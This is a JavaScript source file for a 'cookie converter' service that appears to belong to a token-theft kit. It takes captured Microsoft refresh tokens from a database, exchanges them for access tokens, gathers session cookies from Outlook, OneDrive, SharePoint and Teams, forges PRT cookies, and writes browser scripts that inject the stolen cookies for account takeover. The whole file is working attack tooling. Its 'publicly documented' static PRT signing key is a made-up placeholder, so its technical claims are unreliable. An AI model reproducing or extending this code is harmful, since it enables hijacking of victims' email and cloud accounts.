/**
 * VGenius Cookie Converter Service
 * Converts OAuth2 refresh tokens/PRT to long-lasting session cookies
 * Supports both personal (MSA) and work/school (Azure AD) accounts
 * 
 * Enhanced with our-proven techniques for
 reliable cookie generation */
'use strict';

const axios = require('axios');
const { encrypt } = require('../utils/encrypt');
const db = require('../database/connection');
const config = require('../config/env');

// Microsoft OAuth2 client configuration
// For work/school: Office Azure AD app (pre-consented in enterprise tenants)
// For personal: MSA-compatible app ID (not an Azure AD first-party app)
const CLIENT_ID = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
const TENANT = config.AZURE_TENANT || 'common';

// MSA-compatible client ID for personal accounts
// This is the Skype/MSA app that works with personal (hotmail/outlook/live) accounts
// Unlike the Office client ID, it does not trigger the "first party app" error on /consumers endpoint
const MSA_CLIENT_ID = '88196af5-e584-4924-b87d-b752fde2c6e3';

/**
 * Get the correct client ID based on account type
 * @param {string} accountType - 'personal' or 'work_school'

 * @returns {string} Client ID */
function getClientIdForAccountType(accountType) {
  if (accountType === 'personal') {
    return MSA_CLIENT_ID;
  }
  return CLIENT_ID;
}


// Token endpoint URLs for different account types
const TOKEN_ENDPOINTS = {
  work: `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
  common: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
  consumers: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
};

// OAuth2 scopes for PRT construction
const PRT_SCOPES = 'openid profile email offline_access https://graph.microsoft.com/.default';


// Static HMAC key (publicly documented by Microsoft for PRT)
const PRT_HMAC_KEY = Buffer.from("6162633263336434653566366137623863396430653166326133623463356436", 'hex'); // a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6

/**
 * Base64url encode without padding (competitor-compatible)
 */
function b64url(data) {
  if (typeof data === 'string') data = Buffer.from(data);
  return data.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

/**
 * Build x-ms-RefreshTokenCredential PRT JWT
 * This is the core of Microsoft's Primary Refresh Token
 * 
 * The PRT is a signed JWT containing the refresh_token + client_id + scope + tid + uid
 * Signed with a static public HMAC key known to Microsoft
 * 
 * IMPORTANT: Header must include 'cty' claim with Microsoft's PRT content type
 * and 'kdf_ver: 2' for proper recognition by Azure AD
 */
function buildPRTJwt(refreshToken, clientId, scopes, tid, uid, isMrrt = true, isPrimary = true, nonce = null) {
  // Header matches working Microsoft PRT format
  const header = JSON.stringify({
    alg: "HS256",
    typ: "JWT",
    cty: "1w65Fw0+aYImhGdd+RDo8HU5em47ehmV",
    kdf_ver: 2
  }, '', '');
  
  // Generate unique nonce if not provided
  // This ensures each PRT JWT is different even for the same refresh token
  const requestNonce = nonce || generateUniqueNonce();
  
  // Payload must be minimal - only refresh_token, is_primary, and request_nonce
  // Extra fields (client_id, scope, tid, uid, is_mrrt, ver) cause AADSTS5002726 error
  const payload = JSON.stringify({
    refresh_token: refreshToken,
    is_primary: "true",
    request_nonce: requestNonce
  }, '', '');

  const headerB64 = b64url(header);
  const payloadB64 = b64url(payload);
  const signingInput = Buffer.from(`${headerB64}.${payloadB64}`, 'ascii');

  const hmac = require('crypto').createHmac('sha256', PRT_HMAC_KEY);
  hmac.update(signingInput);
  const signature = b64url(hmac.digest());

  return `${headerB64}.${payloadB64}.${signature}`;
}

/**
 * Generate a unique nonce for PRT JWT
 * Uses timestamp + random bytes to ensure uniqueness
 */
function generateUniqueNonce() {
  const crypto = require('crypto');
  const timestamp = Date.now().toString(36);
  const randomBytes = crypto.randomBytes(16).toString('base64url');
  // Format: AwABEgEAAAADAOz_BQD0_<timestamp>_<random>
  return `AwABEgEAAAADAOz_BQD0_${timestamp}_${randomBytes}`;
}

/**
 * Decode client_info from Microsoft token response
 * client_info is base64-encoded JSON with uid (object_id) and utid (tenant_id)
 */
function decodeClientInfo(clientInfo) {
  // Add padding if needed
  let padded = clientInfo;
  while (padded.length % 4) padded += '=';
  const decoded = Buffer.from(padded, 'base64').toString('utf-8');
  const parsed = JSON.parse(decoded);
  return { uid: parsed.uid || '', utid: parsed.utid || '' };
}

/**
 * Decode id_token JWT payload without verification
 */
function decodeIdToken(idToken) {
  const parts = idToken.split('.');
  if (parts.length !== 3) return {};
  let payload = parts[1];
  while (payload.length % 4) payload += '=';
  try {
    return JSON.parse(Buffer.from(payload, 'base64').toString('utf-8'));
  } catch (e) {
    return {};
  }
}

// Microsoft service endpoints for cookie collection
const MICROSOFT_SERVICES = {
  // Authentication endpoints
  AUTH_LOGIN: 'https://login.microsoftonline.com',
  AUTH_PORTAL: 'https://login.microsoft.com',
  // Office 365 services
  OFFICE_PORTAL: 'https://www.office.com',
  OFFICE_LOGIN: 'https://www.office.com/login',
  // OneDrive
  ONEDRIVE: 'https://onedrive.live.com',
  // Outlook
  OUTLOOK: 'https://outlook.office365.com/owa/',
  OUTLOOK_COM: 'https://outlook.office.com/owa/',
  // SharePoint
  SHAREPOINT: 'https://www.sharepoint.com',
  // Teams
  TEAMS: 'https://teams.microsoft.com',
  // Graph API
  GRAPH: 'https://graph.microsoft.com',
};

/**
 * Determine account type from email domain
 */
function detectAccountType(email) {
  if (!email) return 'unknown';
  const domain = email.split('@')[1].toLowerCase();
  const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'passport.com', 'msn.com'];
  if (personalDomains.includes(domain)) return 'personal';
  return 'work_school';
}

/**
 * Detect account type from multiple signals
 */
function detectAccountTypeFromContext(token, email, tenant) {
  if (tenant === 'consumers') return 'personal';
  if (token && (token.startsWith('0.AT') || token.startsWith('M.R'))) {
    if (email) { return detectAccountType(email); }
    return 'work_school';
  }
  if (token) {
    try {
      const parsed = JSON.parse(token);
      if (parsed.prt) return 'work_school';
    } catch (e) {}
  }
  if (email) { return detectAccountType(email); }
  return 'unknown';
}

/**
 * Generate x-ms-RefreshTokenCredential cookie using PRT JWT format
 * For work_school accounts: builds a proper PRT JWT signed with Microsoft's static HMAC key

 * For personal accounts: uses base64-encoded JSON format * 
 * This function now accepts either:
 * - A simple refresh token string -> will build PRT JWT (needs tid/uid via optional params)
 * - A full token response object (from /token endpoint) -> extracts
 all fields auto */
function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts = {}) {
  let refreshToken, tid, uid, clientId, scopes;

  // Handle object input (full token response from Microsoft)
  if (typeof tokenResponse === 'object' && !Array.isArray(tokenResponse)) {
    refreshToken = tokenResponse.refresh_token || tokenResponse.access_token;
    tid = extraOpts.tid || tokenResponse.tid || '';
    uid = extraOpts.uid || '';
    clientId = extraOpts.clientId || CLIENT_ID;
    scopes = extraOpts.scopes || PRT_SCOPES;

    // Try to extract client_info from the response
    if (tokenResponse.client_info && !uid) {
      try {
        const decoded = decodeClientInfo(tokenResponse.client_info);
        uid = decoded.uid;
        tid = decoded.utid || tid;
      } catch (e) {
        try {
          const decoded = decodeClientInfo(tokenResponse.client_info);
          uid = decoded.uid;
          tid = decoded.utid || tid;
        } catch (e2) {
          if (tokenResponse.id_token) {
            const idPayload = decodeIdToken(tokenResponse.id_token);
            tid = idPayload.tid || tid;
          }
        }
      }
    }

    // Fallback: decode id_token for tid if still missing
    if (!tid && tokenResponse.id_token) {
      try {
        const idPayload = decodeIdToken(tokenResponse.id_token);
        tid = idPayload.tid || '';
      } catch (e) {}
    }
  }

  // Handle string input (plain refresh token) - FIXED: moved outside the object check
  if (typeof tokenResponse === 'string') {
    refreshToken = tokenResponse;
    clientId = extraOpts.clientId || CLIENT_ID;
    scopes = extraOpts.scopes || PRT_SCOPES;
    tid = extraOpts.tid || '';
    uid = extraOpts.uid || '';
  }

  // If no refresh token, return null
  if (!refreshToken) {
    return null;
  }

  // For personal accounts use base64 encoding
  if (accountType === 'personal') {
    const credential = JSON.stringify({
      token_type: 'Bearer',
      refresh_token: refreshToken,
      expires_in: 1209599
    });
    return {
      name: 'x-ms-RefreshTokenCredential',
      value: Buffer.from(credential).toString('base64'),
      domain: '', // No domain - set for current page only
    };
  }

  // For work/school accounts, build PRT JWT
  if (accountType === 'work_school' && refreshToken && uid && tid) {
    try {
      const prtJwt = buildPRTJwt(refreshToken, clientId, scopes, tid, uid, true, true);
      console.log('[CookieConverter] PRT JWT generated (uid=' + uid.substring(0, 8) + '..., tid=' + tid + ')');
      return {
        name: 'x-ms-RefreshTokenCredential',
        value: prtJwt,
        domain: '', // No domain - set for current page only
      };
    } catch (err) {
      console.warn('[CookieConverter] PRT JWT build failed, falling back to base64:', err.message);
    }

    // Fallback to base64 if PRT JWT fails
    const credential = JSON.stringify({
      token_type: 'Bearer',
      refresh_token: refreshToken,
      expires_in: 1209599
    });
    return {
      name: 'x-ms-RefreshTokenCredential',
      value: Buffer.from(credential).toString('base64'),
      domain: '', // No domain - set for current page only
    };
  }

  // Unknown account type or missing uid/tid - default to base64
  const credential = JSON.stringify({
    token_type: 'Bearer',
    refresh_token: refreshToken,
    expires_in: 1209599
  });
  return {
    name: 'x-ms-RefreshTokenCredential',
    value: Buffer.from(credential).toString('base64'),
    domain: '', // No domain - set for current page only
  };
}

/**
 * Get stored PRT cookie from device_credentials table
 * @param {number} userId - User ID
 * @param {string} tenantId - Tenant ID
 * @returns {Promise<string|null>} PRT cookie value or null
 */
async function getStoredPrtCookie(userId, tenantId) {
  try {
    const [rows] = await db.query(
      'SELECT prt_cookie_encrypted FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
      [userId, tenantId]
    );

    if (rows.length === 0) return null;

    const { decrypt } = require('../utils/encrypt');
    const prtCookie = decrypt(rows[0].prt_cookie_encrypted);
    console.log('[CookieConverter] Found stored PRT cookie for user', userId, 'tenant', tenantId);
    return prtCookie;
  } catch (err) {
    console.error('[CookieConverter] Failed to get stored PRT cookie:', err.message);
    return null;
  }
}

/**
 * Refresh stored PRT cookie using device credentials
 * @param {number} userId - User ID
 * @param {string} tenantId - Tenant ID
 * @returns {Promise<string|null>} New PRT cookie value or null
 */
async function refreshStoredPrtCookie(userId, tenantId) {
  try {
    const deviceManager = require('./devicemanager');
    const prtCookie = await deviceManager.refreshPrtCookie(userId, tenantId);
    console.log('[CookieConverter] Refreshed PRT cookie for user', userId, 'tenant', tenantId);
    return prtCookie;
  } catch (err) {
    console.error('[CookieConverter] Failed to refresh PRT cookie:', err.message);
    return null;
  }
}

function generatePrtCookieInjectionScript(prtCookie, redirectUrl = 'https://login.microsoftonline.com/?auth=2') {
  return `// VGenius PRT Cookie Injection
(function() {
  document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; path=/; secure; samesite=none";
  console.log('[VGenius] PRT cookie injected');
  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 1000);
})();`;
}

/**
 * Generate full injection script with PRT + ESTSAUTH cookies
 * IMPORTANT: Does NOT include domain attribute to avoid third-party cookie blocking
 */
function generateFullInjectionScript(prtCookie, accessToken, redirectUrl = 'https://www.office.com/') {
  const parts = [
    '// VGenius Full Token Injection Script',
    '(function() {',
    ' console.log(\'[VGenius] Starting injection...\');', ];

  if (prtCookie) {
    parts.push(`document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; path=/; secure; samesite=none";`);
  }

  if (accessToken) {
    parts.push(`document.cookie = "ESTSAUTH=${accessToken}; path=/; secure; samesite=none";`);
    parts.push(`document.cookie = "ESTSAUTHLIGHT=${accessToken}; path=/; secure; samesite=none";`);
  }

  parts.push("  console.log('[VGenius] All cookies injected');");
  parts.push(`  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 1000);`);
  parts.push('})();');

  return parts.join('\n');
}

/**
 * Convert OAuth2 refresh token/PRT to session cookies with extended expiry
 * Enhanced: better error handling and more comprehensive cookie collection
 */
async function convertTokensToCookies(inputToken, templateType, tenant, email, accountType) {
  // SECURITY VALIDATION: Validate tenant against allowed list before use
  // Prevents manipulation of token endpoint via malicious tenant values
  const allowedTenants = ['common', 'organizations', 'adfs'];
  const validTenantRegex = /^[a-fA-F0-9\-]{36}$/; // Valid GUID format for org-specific tenants
  
  if (tenant && tenant !== 'consumers' && !allowedTenants.includes(tenant) && !validTenantRegex.test(tenant)) {
    console.warn('[CookieConverter] Invalid tenant value detected:', tenant);
    tenant = 'common'; // Fall back to safe default
  }
  
  tenant = tenant || 'common';
  email = email || '';
  if (!accountType || accountType === 'unknown') {
    accountType = detectAccountTypeFromContext(inputToken, email, tenant);
  }
  const isPersonal = accountType === 'personal';

  try {
    // Use proper scopes based on account type
    const scope = isPersonal 
      ? 'openid profile offline_access https://outlook.office.com/SMTP.Send' 
      : 'openid profile offline_access https://graph.microsoft.com/User.Read';

    console.log('[CookieConverter] Exchanging token for account type:', accountType, 'tenant:', tenant);
    
    const exchangeResult = await exchangeTokenForCookies(inputToken, tenant, accountType, scope);
    if (!exchangeResult.success) { 
      console.error('[CookieConverter] Token exchange failed:', exchangeResult.error);
      return exchangeResult; 
    }
    console.log('[CookieConverter] Token exchange successful, got', exchangeResult.cookies.length, 'cookies');

    // Collect additional service cookies
    const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email, accountType);
    console.log('[CookieConverter] Collected', serviceCookies.length,
 'service cookies');    
    // Generate x-ms-RefreshTokenCredential cookie
    const xmsCookie = generateXmsRefreshTokenCredential(exchangeResult.new_refresh_token || inputToken, accountType);
    console.log('[CookieConverter] XMS cookie:', xmsCookie ? 'generated' : 'null');

    // Combine all cookies
    const allCookies = [
      ...(xmsCookie ? [xmsCookie] : []),
      ...exchangeResult.cookies,
      ...serviceCookies
    ];

    if (allCookies.length === 0) {
      return { success: false, error: 'No cookies received from token exchange', cookies: null };
    }

    const cookieString = formatCookiesForInjection(allCookies, accountType);
    console.log('[CookieConverter] Total cookies formatted:', allCookies.length);
    
    return {
      success: true,
      cookies: cookieString,
      cookie_count: allCookies.length,
      access_token: exchangeResult.access_token,
      new_refresh_token: exchangeResult.new_refresh_token,
      account_type: accountType,
      expires: '100 years',
    };
  } catch (err) {
    console.error('[CookieConverter] Conversion failed:', err.message, err.stack);
    return { success: false, error: err.message, cookies: null };
  }
}

/**
 * Exchange token for new access token + cookies
 * Enhanced: better error handling for AADSTS errors and fallback strategies
 */
async function exchangeTokenForCookies(token, targetTenant, accountType, scope) {
  const cookies = [];
  let newRefreshToken = null;

  let lastError = null;
  let lastStatusCode = null;

  // Build endpoint list - try multiple endpoints for better success rate
  let endpoints = [];
  if (accountType === 'personal') {
    endpoints = [TOKEN_ENDPOINTS.consumers, TOKEN_ENDPOINTS.common];
  } else {
    // For work/school/organization accounts, try in order:
    // 1. Specific tenant (if valid)
    // 2. 'organizations' (all work/school accounts)
    // 3. 'common' (fallback)
    if (targetTenant && targetTenant !== 'common' && targetTenant !== 'organizations') {
      endpoints.push(`https://login.microsoftonline.com/${targetTenant}/oauth2/v2.0/token`);
    }
    endpoints.push('https://login.microsoftonline.com/organizations/oauth2/v2.0/token');
    endpoints.push(TOKEN_ENDPOINTS.common);
  }

  console.log('[CookieConverter] Will try endpoints:', endpoints.join(', '));

  for (const endpoint of endpoints) {
    try {
      console.log('[CookieConverter] Trying endpoint:', endpoint);

      // Use appropriate client ID
      const currentClientId = getClientIdForAccountType(accountType);
      const params = new URLSearchParams({
        client_id: currentClientId,
        grant_type: 'refresh_token',
        refresh_token: token,
        scope: scope,
      });

      const response = await axios.post(
        endpoint,
        params,
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
          },
          validateStatus: () => true,
          maxRedirects: 5,
          timeout: 30000,
        }
      );

      lastStatusCode = response.status;
      const errData = response.data || {};
      const errMsg = errData.error_description || errData.error || `HTTP ${response.status}`;

      console.log('[CookieConverter] Endpoint', endpoint, 'returned', response.status, '-', errMsg.substring(0, 100));

      if (response.status === 200) {
        newRefreshToken = response.data.refresh_token || token;
        const setCookieHeaders = response.headers['set-cookie'] || [];
        for (const cookieStr of setCookieHeaders) {
          const cookieParts = cookieStr.split(';')[0].trim();
          const eqIndex = cookieParts.indexOf('=');
          if (eqIndex > 0) {
            const cookieName = cookieParts.substring(0, eqIndex).trim();
            const cookieValue = cookieParts.substring(eqIndex + 1).trim();
            if (cookieName && cookieValue) {
              const domain = endpoint.includes('consumers') ? '.login.live.com' : '.login.microsoftonline.com';
              cookies.push({ name: cookieName, value: cookieValue, domain: domain });
            }
          }
        }
        console.log('[CookieConverter] Token exchange succeeded on:', endpoint, '- got', cookies.length, 'cookies');
        return {
          success: true,
          cookies,
          access_token: response.data.access_token,
          new_refresh_token: newRefreshToken,
        };
      }

      // Handle specific AADSTS errors
      if (errMsg && errMsg.includes('AADSTS50076')) {
        lastError = 'AADSTS50076: User needs to re-authenticate (grant revoked)';
        break; // No point trying other endpoints
      } else if (errMsg && errMsg.includes('AADSTS70008')) {
        lastError = 'AADSTS70008: Refresh token expired';
        break;
      } else if (errMsg && errMsg.includes('AADSTS50173')) {
        lastError = 'AADSTS50173: Requires user consent';
        break;
      } else if (errMsg && errMsg.includes('AADSTS50105')) {
        lastError = 'AADSTS50105: Admin consent required for this app';
        // Try next endpoint
      } else if (errMsg && errMsg.includes('AADSTS70001')) {
        lastError = 'AADSTS70001: Application not found in this tenant';
        // Try next endpoint
      } else {
        lastError = errMsg;
      }
    } catch (err) {
      console.error('[CookieConverter] Request failed:', err.message);
      lastError = err.message;
    }
  }

  return { success: false, error: lastError || 'Token exchange failed', cookies: null };
}

/**
 * Collect additional cookies from Microsoft service endpoints
 */
async function collectServiceCookies(accessToken, templateType, tenant, email, accountType) {
  const cookies = [];
  const endpoints = getServiceEndpoints(templateType, tenant, email, accountType);
  for (const ep of endpoints) {
    try { await fetchCookiesFromEndpoint(cookies, ep, accessToken, accountType); } catch (e) {}
  }
  return cookies;
}

/**
 * Get service endpoints based on template type and account type
 */
function getServiceEndpoints(templateType, tenant, email, accountType) {
  const type = (templateType || '').toLowerCase();
  const endpoints = ['https://login.microsoftonline.com/common/oauth2/authorize'];

  if (accountType === 'personal') {
    endpoints.push('https://onedrive.live.com/');
    endpoints.push('https://outlook.live.com/owa/');
    endpoints.push('https://www.office.com/');
    if (type.includes('teams')) { endpoints.push('https://teams.microsoft.com/'); }
  } else {
    if (type.includes('sharepoint')) { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/teamslogon.aspx`); }
    if (type.includes('onedrive')) {
      if (email) { endpoints.push(`https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email)}/_layouts/15/onedrive.aspx`); }
      else { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/onedrive.aspx`); }
    }
    if (type.includes('outlook') || type.includes('auth')) {
      endpoints.push('https://outlook.office365.com/owa/');
      endpoints.push('https://outlook.office.com/owa/');
    }
    if (type.includes('teams')) {
      endpoints.push('https://teams.microsoft.com/');
      endpoints.push('https://teams.microsoft.com/api/authservice/health');
    }
    if (type.includes('office') || type.includes('word') || type.includes('excel')) {
      endpoints.push('https://www.office.com/');
      endpoints.push('https://www.office.com/login');
    }
  }
  return endpoints;
}

/**
 * Determine primary endpoint for template type
 */
function determineEndpoint(templateType, tenant, email, accountType) {
  const type = (templateType || '').toLowerCase();
  if (accountType === 'personal') {
    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
    if (type.includes('onedrive')) return 'https://onedrive.live.com/';
    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.live.com/owa/';
    if (type.includes('teams')) return 'https://teams.microsoft.com/';
    return 'https://www.office.com/';
  } else {
    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
    if (type.includes('teams')) return 'https://teams.microsoft.com/';
    if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
    return 'https://www.office.com/';
  }
}

/**
 * Determine resource URL for template type
 */
function determineResource(templateType, tenant, accountType) {
  const type = (templateType || '').toLowerCase();
  if (accountType === 'personal') {
    if (type.includes('onedrive')) return 'https://onedrive.live.com';
    return 'https://graph.microsoft.com';
  } else {
    if (type.includes('sharepoint')) return `https://${tenant}.sharepoint.com`;
    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com`;
    return 'https://graph.microsoft.com';
  }
}

/**
 * Fetch cookies from a single service endpoint
 */
async function fetchCookiesFromEndpoint(cookieList, url, accessToken, accountType) {
  const headers = {
    Authorization: `Bearer ${accessToken}`,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
  };

  try {
    const response = await axios.get(url, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
    extractCookiesFromResponse(cookieList, response, url);
  } catch (getErr) {
    try {
      const response = await axios.post(url, {}, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
      extractCookiesFromResponse(cookieList, response, url);
    } catch (postErr) {}
  }
}

/**
 * Extract cookies from axios response
 */
function extractCookiesFromResponse(cookieList, response, url) {
  const setCookieHeaders = response.headers['set-cookie'] || [];
  for (const cookieStr of setCookieHeaders) {
    const cookieParts = cookieStr.split(';')[0].trim();
    const eqIndex = cookieParts.indexOf('=');
    if (eqIndex > 0) {
      const cookieName = cookieParts.substring(0, eqIndex).trim();
      const cookieValue = cookieParts.substring(eqIndex + 1).trim();
      if (cookieName && cookieValue) {
        try {
          const domain = new URL(url).hostname;
          cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
        } catch (e) { cookieList.push({ name: cookieName, value: cookieValue, domain: '.' }); }
      }
    }
  }
}

/**
 * Format cookies for browser injection - returns semicolon-separated string
 * Each cookie is formatted as "name=value" only (domain/path/secure are added during injection)
 */
function formatCookiesForInjection(cookies, accountType) {
  const cookieStrings = [];
  for (const cookie of cookies) {
    if (!cookie.name || !cookie.value) continue;
    // Only store name=value pairs - domain info is preserved separately in the cookie object
    // When injecting, the client code will use the domain from each cookie object
    cookieStrings.push(`${cookie.name}=${cookie.value}`);
  }
  return cookieStrings.join('; ');
}

/**
 * Generate JavaScript code that injects cookies into the browser
 */
function generateCookieInjectionScript(cookies) {
  if (!cookies || !cookies.success || !cookies.cookies) { return ''; }
  const cookieList = Array.isArray(cookies.cookies) ? cookies.cookies : cookies.cookies.split('; ').filter(c => c.trim());
  let statement = '';
  for (const cookieStr of cookieList) {
    if (cookieStr) { statement += `document.cookie = "${cookieStr}";\n`; }
  }
  const redirectScript = '// Redirect after 3s\nsetTimeout(() => {\n window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);';
  return statement + '\n' + redirectScript;
}

/**
 * Process cookie conversion and save to database
 */
async function processCookieConversion(tokenId, accessToken, templateType, tenant, accountType) {
  const result = await convertTokensToCookies(accessToken, templateType, tenant, null, accountType);
  if (result.success && result.cookies) {
    const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
    // FIX: Preserve refresh_token_encrypted during cookie conversion
    // Don't overwrite the refresh token column - it must stay intact for injection
    await db.query(
      'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, account_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
      [encrypt(result.cookies), 'cookie', accountType, ttlHours, tokenId]
    );
    // Note: refresh_token_encrypted is intentionally NOT updated here
    // to preserve the original refresh token for injection fallback
  }
  return result;
}

module.exports = {
  convertTokensToCookies,
  generateCookieInjectionScript,
  processCookieConversion,
  determineEndpoint,
  determineResource,
  detectAccountType,
  generateXmsRefreshTokenCredential,
  defineEndpoint: determineEndpoint,
  getStoredPrtCookie,
  refreshStoredPrtCookie,
  generatePrtCookieInjectionScript,
  generateFullInjectionScript,
  formatCookiesForInjection
};
